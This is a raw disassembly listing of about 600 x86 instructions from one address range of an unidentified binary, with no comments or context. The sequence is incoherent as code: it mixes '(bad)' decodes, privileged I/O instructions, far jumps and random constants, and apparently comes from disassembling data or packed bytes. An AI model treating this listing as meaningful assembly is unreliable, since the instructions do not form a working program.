  40e903:	sbb    edi,eax
  40e905:	sbb    al,0xf4
  40e907:	ins    DWORD PTR es:[edi],dx
  40e908:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e909:	sbb    eax,0xd788cff1
  40e90e:	aad    0x32
  40e910:	dec    esp
  40e911:	dec    ebx
  40e912:	addr16 jge 0x40e984
  40e915:	pop    ebp
  40e916:	iret   
  40e917:	stos   DWORD PTR es:[edi],eax
  40e918:	and    al,0xae
  40e91a:	push   esp
  40e91b:	mov    bl,0xc
  40e91d:	jbe    0x40e985
  40e91f:	ret    
  40e920:	fwait
  40e921:	int    0xe0
  40e923:	outs   dx,DWORD PTR ds:[esi]
  40e924:	lahf   
  40e925:	ror    esi,1
  40e927:	mov    edx,DWORD PTR [ebx-0x35]
  40e92a:	clc    
  40e92b:	and    eax,ebx
  40e92d:	add    edx,DWORD PTR [edi-0x3762185]
  40e933:	or     ecx,DWORD PTR [ecx-0x1d]
  40e936:	lods   al,BYTE PTR ds:[esi]
  40e937:	xchg   DWORD PTR [edi*4+0x555acc6e],esp
  40e93e:	and    al,0x5d
  40e940:	pop    ecx
  40e941:	stos   DWORD PTR es:[edi],eax
  40e942:	repz fild DWORD PTR [ebx]
  40e945:	mov    esi,0x5105a1ba
  40e94a:	mov    ah,0xb1
  40e94c:	sti    
  40e94d:	(bad)  
  40e94e:	(bad)  
  40e94f:	jmp    0x7f3c:0x187e5601
  40e956:	add    al,0x10
  40e958:	out    dx,eax
  40e959:	add    DWORD PTR [edx],0xc283dc02
  40e95f:	xchg   BYTE PTR [ebx],al
  40e961:	mov    WORD PTR [ecx+0x55],?
  40e964:	jmp    0x40e9a2
  40e966:	in     eax,dx
  40e967:	out    0x1b,eax
  40e969:	jmp    0x1a0f39c5
  40e96e:	in     eax,dx
  40e96f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e970:	jg     0x40e99c
  40e972:	adc    bh,BYTE PTR [edx+0x44]
  40e975:	and    DWORD PTR [ebx+0xe],0x18e2b7e6
  40e97c:	xor    dl,BYTE PTR [ebx-0x1561cb7d]
  40e982:	sbb    eax,0xdb55c9c3
  40e987:	mov    edi,0x2341bc93
  40e98c:	jne    0x40e9c7
  40e98e:	pop    ebx
  40e98f:	enter  0x6e30,0xf8
  40e993:	inc    esp
  40e994:	retf   0x9bdb
  40e997:	mov    edi,0xb1cda4da
  40e99c:	ror    BYTE PTR [ebx],0x8c
  40e99f:	mov    fs,WORD PTR [ebx+0x703a510a]
  40e9a5:	push   ebp
  40e9a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e9a7:	lods   eax,DWORD PTR ds:[esi]
  40e9a8:	push   ebp
  40e9a9:	mov    ch,0xba
  40e9ab:	pop    ds
  40e9ac:	sub    al,0xe4
  40e9ae:	outs   dx,DWORD PTR ds:[esi]
  40e9af:	push   es
  40e9b0:	les    edi,FWORD PTR [ecx]
  40e9b2:	sahf   
  40e9b3:	or     ebx,0x888653fd
  40e9b9:	fs mov edi,0x93b15a95
  40e9bf:	cmp    BYTE PTR cs:[eax+0xb],ah
  40e9c3:	sbb    ecx,DWORD PTR [esi-0x21]
  40e9c6:	(bad)  [esp+edi*2]
  40e9c9:	loope  0x40e9c5
  40e9cb:	pop    ss
  40e9cc:	outs   dx,DWORD PTR ds:[esi]
  40e9cd:	cpuid  
  40e9cf:	aas    
  40e9d0:	mov    ds:0xfcab2154,al
  40e9d5:	jns    0x40ea30
  40e9d7:	jge    0x40e99c
  40e9d9:	mov    DWORD PTR [ebx],ebp
  40e9db:	hlt    
  40e9dc:	and    edx,DWORD PTR [eax-0x6e0a6521]
  40e9e2:	fidiv  DWORD PTR [ecx+0x7d529ca6]
  40e9e8:	adc    DWORD PTR [eax-0x5f6dcf9e],esi
  40e9ee:	retf   
  40e9ef:	jecxz  0x40ea56
  40e9f1:	push   es
  40e9f2:	fcomip st,st(5)
  40e9f4:	into   
  40e9f5:	sbb    BYTE PTR [edi],bh
  40e9f7:	jno    0x40ea43
  40e9f9:	ja     0x40e98b
  40e9fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e9fc:	bound  edx,QWORD PTR [edi+0x546abf85]
  40ea02:	xchg   DWORD PTR [esi-0x3a1c6311],ebp
  40ea08:	xchg   WORD PTR [ebx+0x171b8dbf],di
  40ea0f:	lsl    esp,sp
  40ea12:	repnz sbb DWORD PTR [edi+0x72976cc],ecx
  40ea19:	cli    
  40ea1a:	(bad)  
  40ea1b:	jo     0x40ea89
  40ea1d:	mov    esi,0x315fc2d1
  40ea22:	enter  0x75e1,0x84
  40ea26:	outs   dx,DWORD PTR ds:[esi]
  40ea27:	sub    DWORD PTR [ecx-0x26714759],edx
  40ea2d:	ss cdq 
  40ea2f:	mov    ds:0x6ff76019,eax
  40ea34:	dec    esp
  40ea35:	or     esi,ecx
  40ea37:	test   eax,0x402aab96
  40ea3c:	push   ebp
  40ea3d:	dec    esp
  40ea3e:	inc    ebx
  40ea3f:	mov    cl,0xc6
  40ea41:	sbb    BYTE PTR [edi],al
  40ea43:	(bad)  
  40ea44:	push   cs
  40ea45:	sbb    al,0xb7
  40ea47:	sbb    DWORD PTR [eax+0x32d9a307],ecx
  40ea4d:	es scas eax,DWORD PTR es:[edi]
  40ea4f:	fisub  DWORD PTR [esi]
  40ea51:	pop    edi
  40ea52:	popf   
  40ea53:	inc    esp
  40ea54:	sti    
  40ea55:	mov    gs,WORD PTR [ecx]
  40ea57:	add    al,0xc5
  40ea59:	mov    ebp,0xcdb557d8
  40ea5e:	shr    BYTE PTR [ebx+0x32],cl
  40ea61:	pusha  
  40ea62:	sub    al,0xb4
  40ea64:	adc    bl,bh
  40ea66:	jne    0x40ea42
  40ea68:	es (bad) 
  40ea6a:	clc    
  40ea6b:	jns    0x40ea03
  40ea6d:	xor    BYTE PTR [ebx+0x4b],ch
  40ea70:	loop   0x40ea63
  40ea72:	je     0x40ea8d
  40ea74:	ds adc eax,0x6543309e
  40ea7a:	mov    eax,0x6ab50293
  40ea7f:	dec    edx
  40ea80:	(bad)  
  40ea81:	out    dx,al
  40ea82:	repz cdq 
  40ea84:	sar    BYTE PTR cs:[eax],0x24
  40ea88:	cdq    
  40ea89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ea8a:	hlt    
  40ea8b:	sbb    al,0x28
  40ea8d:	mov    ds:0x2c09d114,eax
  40ea92:	push   ecx
  40ea93:	scas   eax,DWORD PTR es:[edi]
  40ea94:	cmp    BYTE PTR [ebx+0x4b],bh
  40ea97:	pushf  
  40ea98:	add    al,0x54
  40ea9a:	lock cmp cl,BYTE PTR [eax+0x14c39359]
  40eaa1:	jmp    0xa5c3:0x9fa9f6f3
  40eaa8:	pop    ebx
  40eaa9:	retf   
  40eaaa:	push   esi
  40eaab:	int    0xd0
  40eaad:	cmp    al,BYTE PTR [ecx-0x217bd874]
  40eab3:	lods   eax,DWORD PTR ds:[esi]
  40eab4:	xor    al,0x20
  40eab6:	out    dx,al
  40eab7:	dec    esi
  40eab8:	or     dh,al
  40eaba:	retf   0xad22
  40eabd:	mov    bh,0xb3
  40eabf:	pop    ebx
  40eac0:	xor    ecx,DWORD PTR [esi]
  40eac2:	int    0x80
  40eac4:	mov    BYTE PTR [eax-0x2f],bl
  40eac7:	cmp    BYTE PTR [ecx-0x3f],dh
  40eaca:	mov    cl,0x73
  40eacc:	rcl    DWORD PTR [eax+0x6a0494d3],0x4f
  40ead3:	jnp    0x40ea8e
  40ead5:	push   ecx
  40ead6:	ret    
  40ead7:	lods   eax,DWORD PTR es:[esi]
  40ead9:	jecxz  0x40ead7
  40eadb:	pop    ecx
  40eadc:	dec    edi
  40eadd:	jp     0x40ea9d
  40eadf:	push   esp
  40eae0:	push   esi
  40eae1:	mov    ds:0xa3161279,al
  40eae6:	jns    0x40eace
  40eae8:	mov    dh,al
  40eaea:	or     eax,ecx
  40eaec:	cwde   
  40eaed:	mov    bl,0xa6
  40eaef:	mov    BYTE PTR [edx-0x5a],cl
  40eaf2:	sbb    al,0x36
  40eaf4:	and    ah,ah
  40eaf6:	jmp    0x6b4780a1
  40eafb:	and    al,0x13
  40eafd:	lds    ebp,FWORD PTR [esi]
  40eaff:	fsubr  DWORD PTR [ebx]
  40eb01:	or     ebp,ebp
  40eb03:	mov    edx,0xe94d26ae
  40eb08:	imul   ebx,DWORD PTR es:[esp+ebp*2+0x49],0xbaa2c557
  40eb11:	pop    eax
  40eb12:	rcl    BYTE PTR [ebp-0x72],cl
  40eb15:	or     bh,BYTE PTR [ebx-0x3a064b4a]
  40eb1b:	bound  eax,QWORD PTR [esi+0x336ba531]
  40eb21:	inc    ebx
  40eb22:	sub    al,0x8d
  40eb24:	std    
  40eb25:	mov    DWORD PTR [ebp-0x4c],edi
  40eb28:	scas   eax,DWORD PTR es:[edi]
  40eb29:	mov    DWORD PTR [edx+0x2a],0x510ed5eb
  40eb30:	fucomi st,st(5)
  40eb32:	push   edi
  40eb33:	and    BYTE PTR [edi-0x46019a4c],dl
  40eb39:	out    0xbb,eax
  40eb3b:	int    0xbf
  40eb3d:	ds lock jnp 0x40eac9
  40eb41:	scas   eax,DWORD PTR es:[edi]
  40eb42:	jge    0x40eb40
  40eb44:	mov    ah,0x8c
  40eb46:	cdq    
  40eb47:	jp     0x40eb82
  40eb49:	and    DWORD PTR [edi-0x4cac8f98],edx
  40eb4f:	mov    eax,ds:0x49ea8e09
  40eb54:	imul   edx,ecx,0xffffffee
  40eb57:	add    bl,0x5c
  40eb5a:	arpl   WORD PTR [ebx-0x28be951a],dx
  40eb60:	jp     0x40eb57
  40eb62:	stos   DWORD PTR es:[edi],eax
  40eb63:	jns    0x40eaf1
  40eb65:	push   cs
  40eb66:	int    0x6b
  40eb68:	add    ah,BYTE PTR [eax-0x67dd77d2]
  40eb6e:	(bad)  
  40eb6f:	aaa    
  40eb70:	add    BYTE PTR [edx-0x74],al
  40eb73:	imul   BYTE PTR [edx]
  40eb75:	pop    ebp
  40eb76:	bswap  esi
  40eb78:	hlt    
  40eb79:	popf   
  40eb7a:	aas    
  40eb7b:	repz in al,0xee
  40eb7e:	mov    ebp,ebp
  40eb80:	nop
  40eb81:	dec    esi
  40eb82:	or     al,0xf9
  40eb84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eb85:	out    0xcb,eax
  40eb87:	inc    edi
  40eb88:	dec    ebp
  40eb89:	pop    ecx
  40eb8a:	dec    esp
  40eb8b:	loop   0x40ebe4
  40eb8d:	jle    0x40eb89
  40eb8f:	cmp    edi,DWORD PTR [ebp-0x35]
  40eb92:	addr16 jmp 0x40ebcf
  40eb95:	mov    ch,dh
  40eb97:	cmc    
  40eb98:	dec    eax
  40eb99:	jmp    0x40eb7a
  40eb9b:	mov    ch,0x3d
  40eb9d:	sub    al,0xce
  40eb9f:	stos   BYTE PTR es:[edi],al
  40eba0:	add    DWORD PTR [ebp+0x170f2fdd],ecx
  40eba6:	sahf   
  40eba7:	iret   
  40eba8:	xor    al,0x52
  40ebaa:	mov    ecx,0x91e8f398
  40ebaf:	test   BYTE PTR [ebx],cl
  40ebb1:	sbb    DWORD PTR ds:[edx+0x1],esi
  40ebb5:	retf   
  40ebb6:	(bad)  
  40ebb7:	rol    bl,cl
  40ebb9:	lahf   
  40ebba:	lods   eax,DWORD PTR ds:[esi]
  40ebbb:	xchg   ebp,eax
  40ebbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ebbd:	xchg   ecx,eax
  40ebbe:	and    BYTE PTR [esi-0x5f],ah
  40ebc1:	xchg   esi,eax
  40ebc2:	and    DWORD PTR [edi],0x7f
  40ebc5:	xchg   edx,eax
  40ebc6:	out    0x98,al
  40ebc8:	pop    edi
  40ebc9:	psubusb mm2,mm7
  40ebcc:	and    cl,BYTE PTR [edx]
  40ebce:	push   ss
  40ebcf:	lods   al,BYTE PTR ds:[esi]
  40ebd0:	ret    0xd4a7
  40ebd3:	and    esi,DWORD PTR [edi+0x3d]
  40ebd6:	sbb    dh,BYTE PTR [ecx+0x4cc41c54]
  40ebdc:	mov    fs,WORD PTR [edx+0x490afc3b]
  40ebe2:	jns    0x40eb87
  40ebe4:	push   edx
  40ebe5:	iret   
  40ebe6:	rcl    BYTE PTR [edi-0x4f85fa7b],1
  40ebec:	and    BYTE PTR [ebx+0x35],dh
  40ebef:	push   ebp
  40ebf0:	daa    
  40ebf1:	and    al,0xb3
  40ebf3:	sub    bl,BYTE PTR [esi+0x15]
  40ebf6:	popf   
  40ebf7:	or     eax,0xc8622a6f
  40ebfc:	sbb    ebx,eax
  40ebfe:	xchg   ecx,eax
  40ebff:	in     eax,dx
  40ec00:	lods   eax,DWORD PTR ds:[esi]
  40ec01:	cs loop 0x40ebcb
  40ec04:	pop    es
  40ec05:	add    BYTE PTR [ecx],ch
  40ec07:	pop    edi
  40ec08:	nop
  40ec09:	jae    0x40ec35
  40ec0b:	aaa    
  40ec0c:	sbb    al,0xcf
  40ec0e:	cmp    DWORD PTR [edx-0x41cd5cd5],edx
  40ec14:	cmp    eax,0x4d6f40c9
  40ec19:	lods   eax,DWORD PTR ds:[esi]
  40ec1a:	les    ebp,FWORD PTR [eax-0x22dedf20]
  40ec20:	mov    ds:0xec13465b,al
  40ec25:	jnp    0x40ebac
  40ec27:	addr16 cwde 
  40ec29:	pop    es
  40ec2a:	out    0x36,al
  40ec2c:	ret    
  40ec2d:	fcomp  DWORD PTR [edx]
  40ec2f:	or     DWORD PTR [ecx],esi
  40ec31:	cmc    
  40ec32:	pop    es
  40ec33:	sbb    DWORD PTR [esi+0x67],ebp
  40ec36:	mov    dl,0xa2
  40ec38:	add    DWORD PTR [ebx+eiz*1-0x2fd26e99],0xffffffda
  40ec40:	mov    cl,0x47
  40ec42:	pop    edi
  40ec43:	pop    es
  40ec44:	push   esi
  40ec45:	mov    edx,0x9aa36974
  40ec4a:	mov    es,eax
  40ec4c:	std    
  40ec4d:	jnp    0x40ebd5
  40ec4f:	jmp    0xaa424667
  40ec54:	jp     0x40ec49
  40ec56:	xchg   ebx,eax
  40ec57:	fsubr  DWORD PTR [ebx-0x76]
  40ec5a:	jne    0x40ebe1
  40ec5c:	xchg   ebp,eax
  40ec5d:	fdivr  QWORD PTR [edi+0x3f]
  40ec60:	ins    DWORD PTR es:[edi],dx
  40ec61:	fidivr DWORD PTR [ebp-0x5379dcce]
  40ec67:	adc    eax,0x1d11567c
  40ec6c:	scas   al,BYTE PTR es:[edi]
  40ec6d:	jl     0x40ecb0
  40ec6f:	inc    ebp
  40ec70:	mov    ds:0xef1db901,al
  40ec75:	xor    eax,0xb025812
  40ec7a:	ja     0x40ec87
  40ec7c:	xchg   edi,eax
  40ec7d:	adc    al,0xda
  40ec7f:	add    cl,ch
  40ec81:	ds and al,0xf2
  40ec84:	add    eax,0x4fa0cf2a
  40ec89:	int3   
  40ec8a:	adc    BYTE PTR [ebp+0x2a],ch
  40ec8d:	jno    0x40ec5c
  40ec8f:	loope  0x40ec5b
  40ec91:	mov    al,ds:0xadbb5d83
  40ec96:	ret    0xc25
  40ec99:	in     eax,0xdb
  40ec9b:	dec    edx
  40ec9c:	(bad)  
  40ec9d:	push   ebp
  40ec9e:	out    0x4d,al
  40eca0:	push   edi
  40eca1:	add    DWORD PTR [esi+0x61a3fbf4],0x45356269
  40ecab:	enter  0x10f1,0x3c
  40ecaf:	(bad)  
  40ecb0:	pusha  
  40ecb1:	gs push edx
  40ecb3:	loop   0x40ec7f
  40ecb5:	imul   edx,DWORD PTR [edi+0x41aa3ad7],0x42e13ae1
  40ecbf:	pop    ss
  40ecc0:	aaa    
  40ecc1:	pop    ss
  40ecc2:	sub    al,0xb4
  40ecc4:	xchg   edi,eax
  40ecc5:	(bad)  
  40ecc6:	fwait
  40ecc7:	push   ebp
  40ecc8:	sahf   
  40ecc9:	lea    edi,[ebp-0x76ff48ee]
  40eccf:	lock aaa 
  40ecd1:	outs   dx,DWORD PTR ds:[esi]
  40ecd2:	xor    eax,0x984dd1c9
  40ecd7:	xchg   ebx,eax
  40ecd8:	fwait
  40ecd9:	ret    
  40ecda:	popf   
  40ecdb:	in     eax,dx
  40ecdc:	pop    edx
  40ecdd:	add    bl,BYTE PTR [ecx-0x47ea8fd9]
  40ece3:	or     DWORD PTR [edx+0x79],edx
  40ece6:	daa    
  40ece7:	rcl    DWORD PTR [edi],0x7c
  40ecea:	hlt    
  40eceb:	xchg   ebp,eax
  40ecec:	enter  0xd62,0xcb
  40ecf0:	test   al,0xd5
  40ecf2:	fidivr DWORD PTR [edx+0x33]
  40ecf5:	add    al,0xd0
  40ecf7:	(bad)  
  40ecf8:	pop    edx
  40ecf9:	jg     0x40ed4b
  40ecfb:	sub    al,0x74
  40ecfd:	cdq    
  40ecfe:	or     bl,BYTE PTR [edi+0x39104e93]
  40ed04:	cmc    
  40ed05:	xor    DWORD PTR [eax],0x5f1ade20
  40ed0b:	inc    ecx
  40ed0c:	dec    edx
  40ed0d:	fstp   DWORD PTR [ebp-0x3abe8bed]
  40ed13:	add    BYTE PTR [edi],0xec
  40ed16:	jb     0x40eceb
  40ed18:	in     al,0x5f
  40ed1a:	fisub  DWORD PTR [edx-0x53036e39]
  40ed20:	add    eax,0x1d765340
  40ed25:	lods   al,BYTE PTR ds:[esi]
  40ed26:	subps  xmm4,xmm6
  40ed29:	(bad)  
  40ed2a:	aad    0x28
  40ed2c:	aas    
  40ed2d:	es jmp ebp
  40ed30:	mov    dl,0x93
  40ed32:	dec    edi
  40ed33:	push   ds
  40ed34:	push   ss
  40ed35:	ins    DWORD PTR es:[edi],dx
  40ed36:	in     eax,dx
  40ed37:	push   eax
  40ed38:	cdq    
  40ed39:	inc    esp
  40ed3a:	ret    
  40ed3b:	xchg   esi,eax
  40ed3c:	dec    ebp
  40ed3d:	mov    cl,0xd4
  40ed3f:	rcr    DWORD PTR ds:0xca9814c9,1
  40ed45:	je     0x40eda6
  40ed47:	pop    ebx
  40ed48:	sahf   
  40ed49:	mov    al,0x8f
  40ed4b:	xor    DWORD PTR [esp+eax*8],0xd
  40ed4f:	test   al,0x8c
  40ed51:	or     al,0xc1
  40ed53:	ja     0x40edb0
  40ed55:	loop   0x40ed11
  40ed57:	push   0xd9f03b48
  40ed5c:	popf   
  40ed5d:	enter  0x8400,0x40
  40ed61:	pop    ecx
  40ed62:	sbb    edx,0xffffffc2
  40ed65:	inc    edi
  40ed66:	(bad)  
  40ed67:	in     eax,0x36
  40ed69:	or     dl,0xb9
  40ed6c:	lods   al,BYTE PTR ds:[esi]
  40ed6d:	sbb    eax,0x7bce62f7
  40ed72:	xchg   ecx,eax
  40ed73:	pop    ds
  40ed74:	sub    al,0x41
  40ed76:	xor    eax,0xf5113c17
  40ed7b:	sub    DWORD PTR [ebx+0x55],edi
  40ed7e:	shl    BYTE PTR [edx-0x6d4ffe1c],1
  40ed84:	les    ecx,FWORD PTR [esi-0x19]
  40ed87:	sbb    eax,0xd643e9a8
  40ed8c:	inc    esp
  40ed8d:	jecxz  0x40ed28
  40ed8f:	add    ch,BYTE PTR [ebp-0x2537f94e]
  40ed95:	or     BYTE PTR [ebx+0x610ddffd],bh
  40ed9b:	shl    BYTE PTR [ebx],0x68
  40ed9e:	out    0xed,al
  40eda0:	scas   eax,DWORD PTR es:[edi]
  40eda1:	pop    edi
  40eda2:	or     ecx,ebx
  40eda4:	jnp    0x40ed9c
  40eda6:	iret   
  40eda7:	dec    ebx
  40eda8:	fsubr  QWORD PTR [ecx]
  40edaa:	push   esp
  40edab:	jo     0x40edd2
  40edad:	sub    eax,0x412b95e4
  40edb2:	add    eax,0xc86ae6ad
  40edb7:	int3   
  40edb8:	fistp  DWORD PTR [ecx]
  40edba:	data16 mov ah,0xf4
  40edbd:	retf   0xe3ae
  40edc0:	mov    ebp,0xb6e6521f
  40edc5:	js     0x40ee34
  40edc7:	lods   eax,DWORD PTR ds:[esi]
  40edc8:	in     eax,dx
  40edc9:	mov    al,ds:0x6a11e177
  40edce:	dec    eax
  40edcf:	call   0xbc48a821
  40edd4:	and    DWORD PTR [ebx+esi*4+0x7e23bdda],esi
  40eddb:	stos   DWORD PTR es:[edi],eax
  40eddc:	test   DWORD PTR [ecx],0xd4fc89f1
  40ede2:	inc    edi
  40ede3:	cmp    edi,DWORD PTR [eax]
  40ede5:	sub    cl,BYTE PTR [ecx+edx*2+0x7b]
  40ede9:	int    0x7c
  40edeb:	cs or  edx,ecx
  40edee:	cmp    eax,0x78edafc5
  40edf3:	xchg   BYTE PTR [eax-0x63aaed7b],bl
  40edf9:	mov    dl,0x99
  40edfb:	fisub  WORD PTR [esi]
  40edfd:	stos   DWORD PTR es:[edi],eax
  40edfe:	bound  ebp,QWORD PTR [edx-0x6c]
  40ee01:	sbb    BYTE PTR [eax],bh
  40ee03:	inc    edx
  40ee04:	leave  
  40ee05:	sbb    al,0x56
  40ee07:	lock add eax,0xf2e31478
  40ee0d:	(bad)  
  40ee0e:	cmp    ecx,DWORD PTR [ebp+0x48]
  40ee11:	jl     0x40ee7a
  40ee13:	jo     0x40ed99
  40ee15:	mov    esp,0x10f9f121
  40ee1a:	adc    eax,0xdcaca869
  40ee1f:	add    DWORD PTR [ecx-0x6f],eax
  40ee22:	mov    ebx,0xdef7366
  40ee27:	push   ebx
  40ee28:	mov    BYTE PTR [ebp+0x73b34104],al
  40ee2e:	ds out 0x40,eax
  40ee31:	mov    al,ds:0xeea81742
  40ee36:	xchg   ecx,eax
  40ee37:	test   DWORD PTR [ebp+0x74011c6e],edi
  40ee3d:	arpl   WORD PTR [ecx],dx
  40ee3f:	push   edi
  40ee40:	fwait
  40ee41:	addr16 in eax,0xc7
  40ee44:	test   al,0x53
  40ee46:	mov    ds:0x4bf06a8f,eax
  40ee4b:	shl    dl,1
  40ee4d:	jg     0x40ee03
  40ee4f:	or     esp,ebp
  40ee51:	inc    ecx
  40ee52:	jbe    0x40eec3
  40ee54:	push   eax
  40ee55:	push   esp
  40ee56:	xchg   esp,eax
  40ee57:	xchg   edi,eax
  40ee58:	out    0x62,eax
  40ee5a:	fistp  QWORD PTR [edx+0x3ccdf65]
  40ee60:	dec    edx
  40ee61:	mov    bl,al
  40ee63:	mov    ch,0xcf
  40ee65:	mov    ds:0x3f5d1c8b,al
  40ee6a:	fimul  WORD PTR [ecx]
  40ee6c:	sbb    al,0xa5
  40ee6e:	inc    ebx
  40ee6f:	std    
  40ee70:	addr16 inc esi
  40ee72:	data16 xlat BYTE PTR ds:[ebx]
  40ee74:	mov    dl,0x2b
  40ee76:	cli    
  40ee77:	add    al,0x9c
  40ee79:	jmp    0x59a2:0xb1527a24
  40ee80:	clc    
  40ee81:	or     al,0x4
  40ee83:	in     al,0xa3
  40ee85:	mov    ds:0xf54f1cb,eax
  40ee8a:	xchg   BYTE PTR [ebx+eax*8-0x410b89c],dl
  40ee91:	loop   0x40eeaf
  40ee93:	jno    0x40ee9b
  40ee95:	rcr    DWORD PTR [ebx+0x79713dee],cl
  40ee9b:	jno    0x40eeee
  40ee9d:	add    eax,0xa0eee3a9
  40eea2:	jp     0x40ee59
  40eea4:	sahf   
  40eea5:	es sbb eax,0x45598f11
  40eeab:	iret   
  40eeac:	iret   
  40eead:	std    
  40eeae:	adc    eax,0x1ac16685
  40eeb3:	clc    
  40eeb4:	call   0x678a:0x4016bac1
  40eebb:	fst    DWORD PTR [ebp+0x9bc3e57]
  40eec1:	xor    esp,DWORD PTR [ebp-0x1f]
  40eec4:	xchg   ecx,eax
  40eec5:	jns    0x40ef2f
  40eec7:	stos   BYTE PTR es:[edi],al
  40eec8:	stos   DWORD PTR es:[edi],eax
  40eec9:	mov    al,ds:0x2432396d
  40eece:	xor    ah,BYTE PTR [edi]
  40eed0:	rcl    DWORD PTR [esp],cl
  40eed3:	shl    BYTE PTR [edx-0x6a],0x37
  40eed7:	inc    eax
  40eed8:	imul   esp,DWORD PTR [esi+0x4],0x50b68708
  40eedf:	cmp    eax,DWORD PTR [esi+ecx*4-0x2072333d]
  40eee6:	mov    esp,0x8ed2fd3f
  40eeeb:	xor    BYTE PTR [ebx-0x37ec344a],bl
  40eef1:	cmp    bh,bl
  40eef3:	cmp    eax,0xaa12c773
  40eef8:	jl     0x40ef65
  40eefa:	or     BYTE PTR [esi+eiz*1+0x615ce54d],bh
  40ef01:	in     eax,dx
  40ef02:	mov    ebp,0x713d58d9
  40ef07:	(bad)  
  40ef09:	jle    0x40ef13
  40ef0b:	mov    edi,0x83e9808b
  40ef10:	jp     0x40ef62
  40ef12:	adc    edi,esi
  40ef14:	ret    
  40ef15:	icebp  
  40ef16:	pop    ebp
  40ef17:	test   al,0x76
  40ef19:	loope  0x40eefe
  40ef1b:	daa    
  40ef1c:	outs   dx,DWORD PTR ds:[esi]
  40ef1d:	dec    ebx
  40ef1e:	add    eax,0x2977bf24
  40ef23:	inc    eax
  40ef24:	daa    
  40ef25:	xor    DWORD PTR [esi-0x1c],0xffffffa2
  40ef29:	das    
  40ef2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ef2b:	mov    eax,0x2bf01d5e
  40ef30:	mov    edx,DWORD PTR [edx]
  40ef32:	js     0x40ef22
  40ef34:	sbb    eax,0x5966cfa3
  40ef39:	pop    es
  40ef3a:	and    edx,DWORD PTR [ebp-0x5b]
  40ef3d:	sbb    dl,BYTE PTR [esi]
  40ef3f:	mov    cl,0x28
  40ef41:	push   ss
  40ef42:	popf   
  40ef43:	sub    al,0xe7
  40ef45:	test   al,0xbc
  40ef47:	popa   
  40ef48:	mov    eax,0x31d0a475
  40ef4d:	cdq    
  40ef4e:	es aaa 
  40ef50:	add    esi,DWORD PTR [eax]
  40ef52:	sbb    BYTE PTR [edi-0x2e],bl
  40ef55:	loope  0x40ef32
  40ef57:	ins    DWORD PTR es:[edi],dx
  40ef58:	mov    ds:0xea3a4948,al
  40ef5d:	outs   dx,DWORD PTR ds:[esi]
  40ef5e:	outs   dx,BYTE PTR ds:[esi]
  40ef5f:	mov    ds:0x49cb2bf5,al
  40ef64:	or     edx,ebx
  40ef66:	(bad)  
  40ef68:	lds    eax,FWORD PTR [ecx+0x11115bbd]
  40ef6e:	fisttp QWORD PTR [edi-0x2254c4a0]
  40ef74:	fwait
  40ef75:	mov    DWORD PTR [esi],edi
  40ef77:	sub    DWORD PTR [edi-0x14],esp
  40ef7a:	data16 int 0xc3
  40ef7d:	xor    bl,BYTE PTR [ecx-0x5458453b]
  40ef83:	(bad)  
  40ef84:	xlat   BYTE PTR ds:[ebx]
  40ef85:	inc    esi
  40ef86:	dec    edx
  40ef87:	dec    ebx
  40ef88:	sti    
  40ef89:	xor    bl,al
  40ef8b:	or     cl,BYTE PTR [edx+0x22]
  40ef8e:	pop    ebx
  40ef8f:	xor    ch,cl
  40ef91:	scas   eax,DWORD PTR es:[edi]
  40ef92:	cmp    bh,BYTE PTR [edi-0x1ececdaf]
  40ef98:	adc    DWORD PTR [edx+0x55],esi
  40ef9b:	in     eax,dx
  40ef9c:	jbe    0x40eff2
  40ef9e:	jmp    0x40ef9f
  40efa0:	xchg   BYTE PTR [eax-0x73],ch
  40efa3:	sbb    eax,0xe8d6ae87
  40efa8:	fisubr WORD PTR [ebx-0xd8585d]
  40efae:	jne    0x40f02e
  40efb0:	(bad)  
  40efb2:	xchg   ebx,eax
  40efb3:	push   cs
  40efb4:	jbe    0x40f027
  40efb6:	clc    
  40efb7:	jmp    0xee1c2325
  40efbc:	out    0x6f,al
  40efbe:	jbe    0x40efd0
  40efc0:	push   ebp
  40efc1:	mov    eax,0x86adb9e0
  40efc6:	mov    cl,0x39
  40efc8:	inc    ebx
  40efc9:	inc    esp
  40efca:	add    eax,0xa6429e92
  40efcf:	xchg   esi,eax
  40efd0:	shl    DWORD PTR ds:0x2fd37364,cl
  40efd6:	ins    BYTE PTR es:[edi],dx
  40efd7:	out    0x23,eax
  40efd9:	fwait
  40efda:	enter  0x49bd,0xf3
  40efde:	cli    
  40efdf:	loopne 0x40efa3
  40efe1:	pop    es
  40efe2:	xchg   ecx,eax
  40efe3:	mov    ?,WORD PTR [ebx-0x71]
  40efe6:	or     DWORD PTR [edx],ecx
  40efe8:	mov    esi,0x9e271d42
  40efed:	in     al,dx
  40efee:	lods   al,BYTE PTR ds:[esi]
  40efef:	mov    ebp,0xc8ff032
  40eff4:	dec    ebp
  40eff5:	mov    esi,0x8ff6cce0
  40effa:	xchg   BYTE PTR [esi+0x2c],bh
  40effd:	popa   
  40effe:	mov    ds:0xefe413cd,al
  40f003:	inc    edi
  40f004:	pushf  
  40f005:	stos   DWORD PTR es:[edi],eax
  40f006:	test   BYTE PTR [eax+esi*4-0x1e5722f],0x7e
  40f00e:	xor    BYTE PTR [ecx+0x6007e8a7],cl
  40f014:	ins    BYTE PTR es:[edi],dx
  40f015:	inc    edi
  40f016:	ja     0x40efa8
  40f018:	leave  
  40f019:	mov    ch,BYTE PTR [edx+esi*1]
  40f01c:	test   al,0x6d
  40f01e:	shl    DWORD PTR [edx+0x3c],1
  40f021:	mov    ah,0xed
  40f023:	xor    cl,BYTE PTR [edi-0x6f]
  40f026:	clc    
  40f027:	dec    esp
  40f028:	repnz cmp al,BYTE PTR fs:[ecx-0x19]
  40f02d:	fcom   QWORD PTR [ebp+0x7178461a]
  40f033:	jmp    0x2d02:0x26fbb783
  40f03a:	dec    esp
  40f03b:	out    0x54,eax
  40f03d:	xchg   edi,eax
  40f03e:	das    
  40f03f:	aam    0xc0
  40f041:	inc    edx
  40f042:	icebp  
  40f043:	mov    dl,BYTE PTR [edx+eiz*1+0x353f538]
  40f04a:	push   0xf56acc79
  40f04f:	mov    ebx,0x729f4c82
